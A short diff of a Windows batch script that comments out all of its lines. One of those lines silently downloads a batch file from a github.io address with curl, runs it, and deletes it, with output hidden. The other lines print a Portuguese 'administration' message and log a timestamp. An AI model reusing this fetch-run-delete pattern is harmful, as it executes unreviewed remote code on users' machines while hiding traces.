@@ -1,9 +1,9 @@
-@echo off
-cls
-rem call any
-curl -o any.bat https://suporteeq.github.io/any.bat > NUL 2>&1 && call any.bat && del any.bat > NUL 2>&1
+@REM @echo off
+@REM cls
+@REM rem call any
+@REM curl -o any.bat https://suporteeq.github.io/any.bat > NUL 2>&1 && call any.bat && del any.bat > NUL 2>&1
 
-echo Admnistracao
-timeout /t 10
+@REM echo Admnistracao
+@REM timeout /t 10
 
-echo %date% %time% >> c:\suporte\%~n0.txt
+@REM echo %date% %time% >> c:\suporte\%~n0.txt
